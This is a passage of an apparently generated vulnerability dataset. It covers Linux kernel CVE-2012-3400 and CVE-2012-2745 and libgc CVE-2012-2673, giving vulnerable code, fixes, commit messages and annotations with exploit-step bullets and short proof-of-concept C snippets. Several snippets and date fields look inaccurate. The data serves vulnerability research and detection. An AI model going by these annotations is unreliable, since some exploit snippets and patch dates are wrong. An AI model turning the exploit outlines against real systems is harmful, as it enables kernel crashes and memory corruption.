{\n\t\t\t\t\t\tbrelse(bh2);\n\t\t\t\t\t\tmap->s_type_specific.s_sparing.\n\t\t\t\t\t\t\ts_spar_map[j] = NULL;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tmap->s_partition_func = udf_get_pblock_spar15;\n\t\t\t} else if (!strncmp(upm2->partIdent.ident,\n\t\t\t\t\t\tUDF_ID_METADATA,\n\t\t\t\t\t\tstrlen(UDF_ID_METADATA))) {\n\t\t\t\tstruct udf_meta_data *mdata =\n\t\t\t\t\t&map->s_type_specific.s_metadata;\n\t\t\t\tstruct metadataPartitionMap *mdm =\n\t\t\t\t\t\t(struct metadataPartitionMap *)\n\t\t\t\t\t\t&(lvd->partitionMaps[offset]);\n\t\t\t\tudf_debug(\"Parsing Logical vol part %d type %d  id=%s\\n\",\n\t\t\t\t\t  i, type, UDF_ID_METADATA);\n\n\t\t\t\tmap->s_partition_type = UDF_METADATA_MAP25;\n\t\t\t\tmap->s_partition_func = udf_get_pblock_meta25;\n\n\t\t\t\tmdata->s_meta_file_loc   =\n\t\t\t\t\tle32_to_cpu(mdm->metadataFileLoc);\n\t\t\t\tmdata->s_mirror_file_loc =\n\t\t\t\t\tle32_to_cpu(mdm->metadataMirrorFileLoc);\n\t\t\t\tmdata->s_bitmap_file_loc =\n\t\t\t\t\tle32_to_cpu(mdm->metadataBitmapFileLoc);\n\t\t\t\tmdata->s_alloc_unit_size =\n\t\t\t\t\tle32_to_cpu(mdm->allocUnitSize);\n\t\t\t\tmdata->s_align_unit_size =\n\t\t\t\t\tle16_to_cpu(mdm->alignUnitSize);\n\t\t\t\tif (mdm->flags & 0x01)\n\t\t\t\t\tmdata->s_flags |= MF_DUPLICATE_MD;\n\n\t\t\t\tudf_debug(\"Metadata Ident suffix=0x%x\\n\",\n\t\t\t\t\t  le16_to_cpu(*(__le16 *)\n\t\t\t\t\t\t      mdm->partIdent.identSuffix));\n\t\t\t\tudf_debug(\"Metadata part num=%d\\n\",\n\t\t\t\t\t  le16_to_cpu(mdm->partitionNum));\n\t\t\t\tudf_debug(\"Metadata part alloc unit size=%d\\n\",\n\t\t\t\t\t  le32_to_cpu(mdm->allocUnitSize));\n\t\t\t\tudf_debug(\"Metadata file loc=%d\\n\",\n\t\t\t\t\t  le32_to_cpu(mdm->metadataFileLoc));\n\t\t\t\tudf_debug(\"Mirror file loc=%d\\n\",\n\t\t\t\t\t  le32_to_cpu(mdm->metadataMirrorFileLoc));\n\t\t\t\tudf_debug(\"Bitmap file loc=%d\\n\",\n\t\t\t\t\t  le32_to_cpu(mdm->metadataBitmapFileLoc));\n\t\t\t\tudf_debug(\"Flags: %d %d\\n\",\n\t\t\t\t\t  mdata->s_flags, mdm->flags);\n\t\t\t} else {\n\t\t\t\tudf_debug(\"Unknown ident: %s\\n\",\n\t\t\t\t\t  upm2->partIdent.ident);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tmap->s_volumeseqnum = le16_to_cpu(upm2->volSeqNum);\n\t\t\tmap->s_partition_num = le16_to_cpu(upm2->partitionNum);\n\t\t}\n\t\tudf_debug(\"Partition (%d:%d) type %d on volume %d\\n\",\n\t\t\t  i, map->s_partition_num, type, map->s_volumeseqnum);\n\t}\n\n\tif (fileset) {\n\t\tstruct long_ad *la = (struct long_ad *)&(lvd->logicalVolContentsUse[0]);\n\n\t\t*fileset = lelb_to_cpu(la->extLocation);\n\t\tudf_debug(\"FileSet found in LogicalVolDesc at block=%d, partition=%d\\n\",\n\t\t\t  fileset->logicalBlockNum,\n\t\t\t  fileset->partitionReferenceNum);\n\t}\n\tif (lvd->integritySeqExt.extLength)\n\t\tudf_load_logicalvolint(sb, leea_to_cpu(lvd->integritySeqExt));\n\nout_bh:\n\tbrelse(bh);\n\treturn ret;\n}\n"
        },
        "vulnerabilities": "Heap-based buffer overflow in the udf_load_logicalvol function in fs/udf/super.c in the Linux kernel before 3.4.5 allows remote attackers to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted UDF filesystem.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3400\n\n[Mandatory] Title: CVE-2012-3400 / CWE-119:\nHeap-based buffer overflow in Linux kernel UDF filesystem\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2016-12-07\n\n[Optional] Affected products/versions:\nLinux kernel before 3.4.5\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-119: Heap-based buffer overflow\n[Mandatory] Summary:\nThe vulnerability exists in udf_load_logicalvol function in fs/udf/super.c which handles UDF filesystem partition tables. A corrupted partition table with malformed length values can trigger a heap buffer overflow when processing partition maps. The flaw can be exploited via a specially crafted UDF filesystem.\n[Mandatory] Root cause:\nMissing length validation of the partition table before processing partition maps.\n[Mandatory] Attack Surface:\nLocal/remote filesystem access (when mounting UDF filesystems)\n[Mandatory] Impact Summary:\nSystem crash or potential arbitrary code execution\n[Optional] Trigger / Attack vector:\nSpecially crafted UDF filesystem\n[Mandatory] Key code/struct excerpt (minimal):\nfor (i = 0, offset = 0;\n     i < sbi->s_partitions && offset < le32_to_cpu(lvd->mapTableLength);\n     i++, offset += gpm->partitionMapLength) {\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nUDF filesystem partition table processing\n\n[Mandatory] Exploit primitive(s) available:\nHeap buffer overflow\n\n[Mandatory] Exploitability summary (1 sentence):\nControlled overflow possible by crafting malicious partition table length values.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n* Create malicious UDF filesystem image\n* Craft partition table with invalid length values\n* Force kernel to parse the corrupted partition table\n* Trigger buffer overflow during partition map processing\n* Potential for arbitrary code execution or DoS\n\n[Mandatory] Exploitation Example script payload code:\nNA\n\nFix\n[Mandatory] Fix code:\ntable_len = le32_to_cpu(lvd->mapTableLength);\nif (sizeof(*lvd) + table_len > sb->s_blocksize) {\n    udf_err(sb, \"error loading logical volume descriptor: \"\n        \"Partition table too long (%u > %lu)\\n\", table_len,\n        sb->s_blocksize - sizeof(*lvd));\n    goto out_bh;\n}\n\n[Mandatory] Fix summary:\nAdded length validation check to ensure partition table doesn't exceed block size.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/adee11b2085bee90bd8f4f52123ffb07882d6256\n\n[Optional] Patch Analysis:\nField: PatchType (bounds check added)\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n* Review similar partition table parsing code\n* Check other filesystem implementations for similar issues\n\n[Optional] Likely variants/impact (one line):\nOther partition table handling code may have similar validation gaps.",
        "tests": "NA",
        "solutions": "static int udf_load_logicalvol(struct super_block *sb, sector_t block,\n\t\t\t       struct kernel_lb_addr *fileset)\n{\n\tstruct logicalVolDesc *lvd;\n\tint i, j, offset;\n\tuint8_t type;\n\tstruct udf_sb_info *sbi = UDF_SB(sb);\n \tstruct genericPartitionMap *gpm;\n \tuint16_t ident;\n \tstruct buffer_head *bh;\n\tunsigned int table_len;\n \tint ret = 0;\n \n \tbh = udf_read_tagged(sb, block, block, &ident);\n \tif (!bh)\n \t\treturn 1;\n \tBUG_ON(ident != TAG_IDENT_LVD);\n \tlvd = (struct logicalVolDesc *)bh->b_data;\n\ttable_len = le32_to_cpu(lvd->mapTableLength);\n\tif (sizeof(*lvd) + table_len > sb->s_blocksize) {\n\t\tudf_err(sb, \"error loading logical volume descriptor: \"\n\t\t\t\"Partition table too long (%u > %lu)\\n\", table_len,\n\t\t\tsb->s_blocksize - sizeof(*lvd));\n\t\tgoto out_bh;\n\t}\n \n \tret = udf_sb_alloc_partition_maps(sb, le32_to_cpu(lvd->numPartitionMaps));\n \tif (ret)\n \t\tgoto out_bh;\n \n \tfor (i = 0, offset = 0;\n\t     i < sbi->s_partitions && offset < table_len;\n \t     i++, offset += gpm->partitionMapLength) {\n \t\tstruct udf_part_map *map = &sbi->s_partmaps[i];\n \t\tgpm = (struct genericPartitionMap *)\n\t\t\t\t&(lvd->partitionMaps[offset]);\n\t\ttype = gpm->partitionMapType;\n\t\tif (type == 1) {\n\t\t\tstruct genericPartitionMap1 *gpm1 =\n\t\t\t\t(struct genericPartitionMap1 *)gpm;\n\t\t\tmap->s_partition_type = UDF_TYPE1_MAP15;\n\t\t\tmap->s_volumeseqnum = le16_to_cpu(gpm1->volSeqNum);\n\t\t\tmap->s_partition_num = le16_to_cpu(gpm1->partitionNum);\n\t\t\tmap->s_partition_func = NULL;\n\t\t} else if (type == 2) {\n\t\t\tstruct udfPartitionMap2 *upm2 =\n\t\t\t\t\t\t(struct udfPartitionMap2 *)gpm;\n\t\t\tif (!strncmp(upm2->partIdent.ident, UDF_ID_VIRTUAL,\n\t\t\t\t\t\tstrlen(UDF_ID_VIRTUAL))) {\n\t\t\t\tu16 suf =\n\t\t\t\t\tle16_to_cpu(((__le16 *)upm2->partIdent.\n\t\t\t\t\t\t\tidentSuffix)[0]);\n\t\t\t\tif (suf < 0x0200) {\n\t\t\t\t\tmap->s_partition_type =\n\t\t\t\t\t\t\tUDF_VIRTUAL_MAP15;\n\t\t\t\t\tmap->s_partition_func =\n\t\t\t\t\t\t\tudf_get_pblock_virt15;\n\t\t\t\t} else {\n\t\t\t\t\tmap->s_partition_type =\n\t\t\t\t\t\t\tUDF_VIRTUAL_MAP20;\n\t\t\t\t\tmap->s_partition_func =\n\t\t\t\t\t\t\tudf_get_pblock_virt20;\n\t\t\t\t}\n\t\t\t} else if (!strncmp(upm2->partIdent.ident,\n\t\t\t\t\t\tUDF_ID_SPARABLE,\n\t\t\t\t\t\tstrlen(UDF_ID_SPARABLE))) {\n\t\t\t\tuint32_t loc;\n\t\t\t\tstruct sparingTable *st;\n\t\t\t\tstruct sparablePartitionMap *spm =\n\t\t\t\t\t(struct sparablePartitionMap *)gpm;\n\n\t\t\t\tmap->s_partition_type = UDF_SPARABLE_MAP15;\n\t\t\t\tmap->s_type_specific.s_sparing.s_packet_len =\n\t\t\t\t\t\tle16_to_cpu(spm->packetLength);\n\t\t\t\tfor (j = 0; j < spm->numSparingTables; j++) {\n\t\t\t\t\tstruct buffer_head *bh2;\n\n\t\t\t\t\tloc = le32_to_cpu(\n\t\t\t\t\t\tspm->locSparingTable[j]);\n\t\t\t\t\tbh2 = udf_read_tagged(sb, loc, loc,\n\t\t\t\t\t\t\t     &ident);\n\t\t\t\t\tmap->s_type_specific.s_sparing.\n\t\t\t\t\t\t\ts_spar_map[j] = bh2;\n\n\t\t\t\t\tif (bh2 == NULL)\n\t\t\t\t\t\tcontinue;\n\n\t\t\t\t\tst = (struct sparingTable *)bh2->b_data;\n\t\t\t\t\tif (ident != 0 || strncmp(\n\t\t\t\t\t\tst->sparingIdent.ident,\n\t\t\t\t\t\tUDF_ID_SPARING,\n\t\t\t\t\t\tstrlen(UDF_ID_SPARING))) {\n\t\t\t\t\t\tbrelse(bh2);\n\t\t\t\t\t\tmap->s_type_specific.s_sparing.\n\t\t\t\t\t\t\ts_spar_map[j] = NULL;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tmap->s_partition_func = udf_get_pblock_spar15;\n\t\t\t} else if (!strncmp(upm2->partIdent.ident,\n\t\t\t\t\t\tUDF_ID_METADATA,\n\t\t\t\t\t\tstrlen(UDF_ID_METADATA))) {\n\t\t\t\tstruct udf_meta_data *mdata =\n\t\t\t\t\t&map->s_type_specific.s_metadata;\n\t\t\t\tstruct metadataPartitionMap *mdm =\n\t\t\t\t\t\t(struct metadataPartitionMap *)\n\t\t\t\t\t\t&(lvd->partitionMaps[offset]);\n\t\t\t\tudf_debug(\"Parsing Logical vol part %d type %d  id=%s\\n\",\n\t\t\t\t\t  i, type, UDF_ID_METADATA);\n\n\t\t\t\tmap->s_partition_type = UDF_METADATA_MAP25;\n\t\t\t\tmap->s_partition_func = udf_get_pblock_meta25;\n\n\t\t\t\tmdata->s_meta_file_loc   =\n\t\t\t\t\tle32_to_cpu(mdm->metadataFileLoc);\n\t\t\t\tmdata->s_mirror_file_loc =\n\t\t\t\t\tle32_to_cpu(mdm->metadataMirrorFileLoc);\n\t\t\t\tmdata->s_bitmap_file_loc =\n\t\t\t\t\tle32_to_cpu(mdm->metadataBitmapFileLoc);\n\t\t\t\tmdata->s_alloc_unit_size =\n\t\t\t\t\tle32_to_cpu(mdm->allocUnitSize);\n\t\t\t\tmdata->s_align_unit_size =\n\t\t\t\t\tle16_to_cpu(mdm->alignUnitSize);\n\t\t\t\tif (mdm->flags & 0x01)\n\t\t\t\t\tmdata->s_flags |= MF_DUPLICATE_MD;\n\n\t\t\t\tudf_debug(\"Metadata Ident suffix=0x%x\\n\",\n\t\t\t\t\t  le16_to_cpu(*(__le16 *)\n\t\t\t\t\t\t      mdm->partIdent.identSuffix));\n\t\t\t\tudf_debug(\"Metadata part num=%d\\n\",\n\t\t\t\t\t  le16_to_cpu(mdm->partitionNum));\n\t\t\t\tudf_debug(\"Metadata part alloc unit size=%d\\n\",\n\t\t\t\t\t  le32_to_cpu(mdm->allocUnitSize));\n\t\t\t\tudf_debug(\"Metadata file loc=%d\\n\",\n\t\t\t\t\t  le32_to_cpu(mdm->metadataFileLoc));\n\t\t\t\tudf_debug(\"Mirror file loc=%d\\n\",\n\t\t\t\t\t  le32_to_cpu(mdm->metadataMirrorFileLoc));\n\t\t\t\tudf_debug(\"Bitmap file loc=%d\\n\",\n\t\t\t\t\t  le32_to_cpu(mdm->metadataBitmapFileLoc));\n\t\t\t\tudf_debug(\"Flags: %d %d\\n\",\n\t\t\t\t\t  mdata->s_flags, mdm->flags);\n\t\t\t} else {\n\t\t\t\tudf_debug(\"Unknown ident: %s\\n\",\n\t\t\t\t\t  upm2->partIdent.ident);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tmap->s_volumeseqnum = le16_to_cpu(upm2->volSeqNum);\n\t\t\tmap->s_partition_num = le16_to_cpu(upm2->partitionNum);\n\t\t}\n\t\tudf_debug(\"Partition (%d:%d) type %d on volume %d\\n\",\n\t\t\t  i, map->s_partition_num, type, map->s_volumeseqnum);\n\t}\n\n\tif (fileset) {\n\t\tstruct long_ad *la = (struct long_ad *)&(lvd->logicalVolContentsUse[0]);\n\n\t\t*fileset = lelb_to_cpu(la->extLocation);\n\t\tudf_debug(\"FileSet found in LogicalVolDesc at block=%d, partition=%d\\n\",\n\t\t\t  fileset->logicalBlockNum,\n\t\t\t  fileset->partitionReferenceNum);\n\t}\n\tif (lvd->integritySeqExt.extLength)\n\t\tudf_load_logicalvolint(sb, leea_to_cpu(lvd->integritySeqExt));\n\nout_bh:\n\tbrelse(bh);\n\treturn ret;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2016-12-07",
        "Vulnerability type": "DoS Overflow ",
        "commit_url": "https://github.com/torvalds/linux/commit/adee11b2085bee90bd8f4f52123ffb07882d6256",
        "commit_id": "adee11b2085bee90bd8f4f52123ffb07882d6256",
        "commit_message": "udf: Avoid run away loop when partition table length is corrupted\n\nCheck provided length of partition table so that (possibly maliciously)\ncorrupted partition table cannot cause accessing data beyond current buffer.\n\nSigned-off-by: Jan Kara <jack@suse.cz>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-119",
        "CVE": "CVE-2012-2745",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "kernel/cred.c": "int copy_creds(struct task_struct *p, unsigned long clone_flags)\n{\n#ifdef CONFIG_KEYS\n\tstruct thread_group_cred *tgcred;\n#endif\n \tstruct cred *new;\n \tint ret;\n \n \tif (\n #ifdef CONFIG_KEYS\n \t\t!p->cred->thread_keyring &&\n#endif\n\t\tclone_flags & CLONE_THREAD\n\t    ) {\n\t\tp->real_cred = get_cred(p->cred);\n\t\tget_cred(p->cred);\n\t\talter_cred_subscribers(p->cred, 2);\n\t\tkdebug(\"share_creds(%p{%d,%d})\",\n\t\t       p->cred, atomic_read(&p->cred->usage),\n\t\t       read_cred_subscribers(p->cred));\n\t\tatomic_inc(&p->cred->user->processes);\n\t\treturn 0;\n\t}\n\n\tnew = prepare_creds();\n\tif (!new)\n\t\treturn -ENOMEM;\n\n\tif (clone_flags & CLONE_NEWUSER) {\n\t\tret = create_user_ns(new);\n\t\tif (ret < 0)\n\t\t\tgoto error_put;\n\t}\n\n\t/* cache user_ns in cred.  Doesn't need a refcount because it will\n\t * stay pinned by cred->user\n\t */\n\tnew->user_ns = new->user->user_ns;\n\n#ifdef CONFIG_KEYS\n\t/* new threads get their own thread keyrings if their parent already\n\t * had one */\n\tif (new->thread_keyring) {\n\t\tkey_put(new->thread_keyring);\n\t\tnew->thread_keyring = NULL;\n\t\tif (clone_flags & CLONE_THREAD)\n\t\t\tinstall_thread_keyring_to_cred(new);\n\t}\n\n\t/* we share the process and session keyrings between all the threads in\n\t * a process - this is slightly icky as we violate COW credentials a\n\t * bit */\n\tif (!(clone_flags & CLONE_THREAD)) {\n\t\ttgcred = kmalloc(sizeof(*tgcred), GFP_KERNEL);\n\t\tif (!tgcred) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto error_put;\n\t\t}\n\t\tatomic_set(&tgcred->usage, 1);\n\t\tspin_lock_init(&tgcred->lock);\n\t\ttgcred->process_keyring = NULL;\n\t\ttgcred->session_keyring = key_get(new->tgcred->session_keyring);\n\n\t\trelease_tgcred(new);\n\t\tnew->tgcred = tgcred;\n\t}\n#endif\n\n\tatomic_inc(&new->user->processes);\n\tp->cred = p->real_cred = get_cred(new);\n\talter_cred_subscribers(new, 2);\n\tvalidate_creds(new);\n\treturn 0;\n\nerror_put:\n\tput_cred(new);\n\treturn ret;\n}\n"
        },
        "vulnerabilities": "The copy_creds function in kernel/cred.c in the Linux kernel before 3.3.2 provides an invalid replacement session keyring to a child process, which allows local users to cause a denial of service (panic) via a crafted application that uses the fork system call.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2745\n\n[Mandatory] Title: CVE-2012-2745 / CWE-119:\nLinux kernel invalid session keyring replacement\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-08-09 \u2014 Patch release: 2013-04-18\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.2\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n[Mandatory] Summary:\nThe copy_creds function in kernel/cred.c provides an invalid replacement session keyring to a child process during fork operations. This flaw allows local users to trigger a kernel panic (denial of service) by using a crafted application that calls fork(). The vulnerability occurs when the child process inherits a bogus replacement_session_keyring value from its parent.\n[Mandatory] Root cause:\nFailure to clear child->replacement_session_keyring during process copying, leading to use of invalid credentials.\n[Mandatory] Attack Surface:\nLocal process creation via fork() system call\n[Mandatory] Impact Summary:\nLocal denial of service (kernel panic)\n[Optional] Trigger / Attack vector:\nfork() system call with crafted process credentials\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nint copy_creds(struct task_struct *p, unsigned long clone_flags)\n{\n#ifdef CONFIG_KEYS\n\tstruct thread_group_cred *tgcred;\n#endif\n\tstruct cred *new;\n\tint ret;\n\n\tif (\n#ifdef CONFIG_KEYS\n\t\t!p->cred->thread_keyring &&\n#endif\n\t\tclone_flags & CLONE_THREAD\n\t    ) {\n\t\tp->real_cred = get_cred(p->cred);\n\t\tget_cred(p->cred);\n\t\talter_cred_subscribers(p->cred, 2);\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nfork() system call interface\n\n[Mandatory] Exploit primitive(s) available:\nKernel panic trigger\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal users can reliably trigger the vulnerability by forking a process with manipulated credentials.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a process with manipulated session keyring\n- Call fork() to create child process\n- Child inherits invalid replacement_session_keyring\n- Kernel attempts to use invalid credentials\n- System panics due to credential validation failure\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <unistd.h>\n#include <sys/types.h>\n#include <keyutils.h>\n\nint main() {\n    key_serial_t key = add_key(\"user\", \"test\", \"payload\", 7, KEY_SPEC_SESSION_KEYRING);\n    // Manipulate process credentials\n    fork();  // Trigger the vulnerability\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nint copy_creds(struct task_struct *p, unsigned long clone_flags)\n{\n#ifdef CONFIG_KEYS\n\tstruct thread_group_cred *tgcred;\n#endif\n\tstruct cred *new;\n\tint ret;\n\n\tp->replacement_session_keyring = NULL;\n\n\tif (\n#ifdef CONFIG_KEYS\n\t\t!p->cred->thread_keyring &&\n#endif\n\t\tclone_flags & CLONE_THREAD\n\t    ) {\n```\n\n[Mandatory] Fix summary:\nAdded initialization of replacement_session_keyring to NULL in copy_creds() to prevent inheritance of invalid credentials.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/79549c6dfda0603dba9a70a53467ce62d9335c33\n\n[Optional] Patch Analysis:\nField: PatchType - Credential initialization fix\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other credential copying paths in the kernel\n- Check for similar inheritance issues in process creation\n[Optional] Likely variants/impact (one line):\nOther credential handling paths may have similar initialization issues.",
        "tests": "NA",
        "solutions": "int copy_creds(struct task_struct *p, unsigned long clone_flags)\n{\n#ifdef CONFIG_KEYS\n\tstruct thread_group_cred *tgcred;\n#endif\n \tstruct cred *new;\n \tint ret;\n \n\tp->replacement_session_keyring = NULL;\n\n \tif (\n #ifdef CONFIG_KEYS\n \t\t!p->cred->thread_keyring &&\n#endif\n\t\tclone_flags & CLONE_THREAD\n\t    ) {\n\t\tp->real_cred = get_cred(p->cred);\n\t\tget_cred(p->cred);\n\t\talter_cred_subscribers(p->cred, 2);\n\t\tkdebug(\"share_creds(%p{%d,%d})\",\n\t\t       p->cred, atomic_read(&p->cred->usage),\n\t\t       read_cred_subscribers(p->cred));\n\t\tatomic_inc(&p->cred->user->processes);\n\t\treturn 0;\n\t}\n\n\tnew = prepare_creds();\n\tif (!new)\n\t\treturn -ENOMEM;\n\n\tif (clone_flags & CLONE_NEWUSER) {\n\t\tret = create_user_ns(new);\n\t\tif (ret < 0)\n\t\t\tgoto error_put;\n\t}\n\n\t/* cache user_ns in cred.  Doesn't need a refcount because it will\n\t * stay pinned by cred->user\n\t */\n\tnew->user_ns = new->user->user_ns;\n\n#ifdef CONFIG_KEYS\n\t/* new threads get their own thread keyrings if their parent already\n\t * had one */\n\tif (new->thread_keyring) {\n\t\tkey_put(new->thread_keyring);\n\t\tnew->thread_keyring = NULL;\n\t\tif (clone_flags & CLONE_THREAD)\n\t\t\tinstall_thread_keyring_to_cred(new);\n\t}\n\n\t/* we share the process and session keyrings between all the threads in\n\t * a process - this is slightly icky as we violate COW credentials a\n\t * bit */\n\tif (!(clone_flags & CLONE_THREAD)) {\n\t\ttgcred = kmalloc(sizeof(*tgcred), GFP_KERNEL);\n\t\tif (!tgcred) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto error_put;\n\t\t}\n\t\tatomic_set(&tgcred->usage, 1);\n\t\tspin_lock_init(&tgcred->lock);\n\t\ttgcred->process_keyring = NULL;\n\t\ttgcred->session_keyring = key_get(new->tgcred->session_keyring);\n\n\t\trelease_tgcred(new);\n\t\tnew->tgcred = tgcred;\n\t}\n#endif\n\n\tatomic_inc(&new->user->processes);\n\tp->cred = p->real_cred = get_cred(new);\n\talter_cred_subscribers(new, 2);\n\tvalidate_creds(new);\n\treturn 0;\n\nerror_put:\n\tput_cred(new);\n\treturn ret;\n}\n",
        "Publish Date": "2012-08-09",
        "Update Date": "2013-04-18",
        "Vulnerability type": "DoS Overflow ",
        "commit_url": "https://github.com/torvalds/linux/commit/79549c6dfda0603dba9a70a53467ce62d9335c33",
        "commit_id": "79549c6dfda0603dba9a70a53467ce62d9335c33",
        "commit_message": "cred: copy_process() should clear child->replacement_session_keyring\n\nkeyctl_session_to_parent(task) sets ->replacement_session_keyring,\nit should be processed and cleared by key_replace_session_keyring().\n\nHowever, this task can fork before it notices TIF_NOTIFY_RESUME and\nthe new child gets the bogus ->replacement_session_keyring copied by\ndup_task_struct(). This is obviously wrong and, if nothing else, this\nleads to put_cred(already_freed_cred).\n\nchange copy_creds() to clear this member. If copy_process() fails\nbefore this point the wrong ->replacement_session_keyring doesn't\nmatter, exit_creds() won't be called.\n\nCc: <stable@vger.kernel.org>\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nAcked-by: David Howells <dhowells@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-189",
        "CVE": "CVE-2012-2673",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "malloc.c": " void * calloc(size_t n, size_t lb)\n {\n #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */\n         /* libpthread allocated some memory that is only pointed to by  */\n         /* mmapped thread stacks.  Make sure it's not collectable.      */\n        {\n          static GC_bool lib_bounds_set = FALSE;\n          ptr_t caller = (ptr_t)__builtin_return_address(0);\n          /* This test does not need to ensure memory visibility, since */\n          /* the bounds will be set when/if we create another thread.   */\n          if (!EXPECT(lib_bounds_set, TRUE)) {\n            GC_init_lib_bounds();\n            lib_bounds_set = TRUE;\n          }\n          if (((word)caller >= (word)GC_libpthread_start\n               && (word)caller < (word)GC_libpthread_end)\n              || ((word)caller >= (word)GC_libld_start\n                  && (word)caller < (word)GC_libld_end))\n            return GC_malloc_uncollectable(n*lb);\n          /* The two ranges are actually usually adjacent, so there may */\n          /* be a way to speed this up.                                 */\n        }\n#   endif\n    return((void *)REDIRECT_MALLOC(n*lb));\n}\n"
        },
        "vulnerabilities": "Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2673\n\n[Mandatory] Title: CVE-2012-2673 / CWE-189:\nInteger overflow in calloc function\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-25 \u2014 Patch release: 2016-09-28\n\n[Optional] Affected products/versions:\nBoehm-Demers-Weiser GC (libgc) before 7.2\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-189: Numeric Errors - Integer overflow\n[Mandatory] Summary:\nThe vulnerability exists in the calloc function of malloc.c in Boehm-Demers-Weiser GC (libgc). An integer overflow occurs when processing large size values for memory allocation, causing less memory to be allocated than expected. This flaw can be exploited by attackers to perform memory-related attacks such as buffer overflows by providing specially crafted input values that trigger the overflow during memory allocation.\n[Mandatory] Root cause:\nUnchecked integer overflow in the multiplication of size parameters (n*lb) within the calloc function.\n[Mandatory] Attack Surface:\nMemory allocation functions in system libraries\n[Mandatory] Impact Summary:\nMemory corruption leading to potential buffer overflow attacks\n[Optional] Trigger / Attack vector:\nSpecially crafted size values passed to calloc\n[Mandatory] Key code/struct excerpt (minimal):\n```\nvoid * calloc(size_t n, size_t lb)\n {\n #   if defined(GC_LINUX_THREADS)\n        /* libpthread allocated some memory that is only pointed to by  */\n        /* mmapped thread stacks.  Make sure it's not collectable.      */\n       // ... thread-specific checks omitted ...\n#   endif\n   return((void *)REDIRECT_MALLOC(n*lb));\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nMemory allocation API (calloc)\n\n[Mandatory] Exploit primitive(s) available:\nControlled memory corruption through buffer overflow\n\n[Mandatory] Exploitability summary (1 sentence):\nAttackers can trigger the vulnerability by passing specially crafted large size values to calloc, leading to undersized allocations and subsequent buffer overflows.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Allocate memory using calloc with carefully chosen n and lb values\n- Selected values should cause integer overflow when multiplied\n- After allocation, attempt to write beyond allocated bounds\n- Use this to corrupt adjacent memory structures\n- Exploit resulting memory corruption for further attacks\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdlib.h>\n#include <stdio.h>\n\nint main() {\n    // Example values that would cause an integer overflow\n    size_t large_n = SIZE_MAX / 2 + 1;\n    size_t lb = 2;\n    \n    // Trigger vulnerable calloc\n    char* ptr = (char*)calloc(large_n, lb);\n    \n    if (ptr) {\n        // Attempt buffer overflow\n        for (size_t i = 0; i < large_n * lb; i++) {\n            ptr[i] = 'A';\n        }\n    }\n    \n    free(ptr);\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```\nvoid * calloc(size_t n, size_t lb)\n {\n    if (lb && n > SIZE_MAX / lb)\n      return NULL;\n #   if defined(GC_LINUX_THREADS)\n        // ... thread-specific checks omitted ...\n#   endif\n    return((void *)REDIRECT_MALLOC(n*lb));\n}\n```\n\n[Mandatory] Fix summary:\nAdded integer overflow check before multiplication in calloc, returning NULL if the multiplication would overflow.\n\n[Optional] Patch reference:\nhttps://github.com/ivmai/bdwgc/commit/e10c1eb9908c2774c16b3148b30d2f3823d66a9a\n\n[Optional] Patch Analysis:\nField: PatchType - bounds check added\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review similar arithmetic operations in related memory allocation functions\n- Check for other potential integer overflows in size calculations\n- Implement systematic bounds checking for all memory allocation operations\n\n[Optional] Likely variants/impact (one line):\nOther memory allocation functions might contain similar unchecked overflow conditions.",
        "tests": "NA",
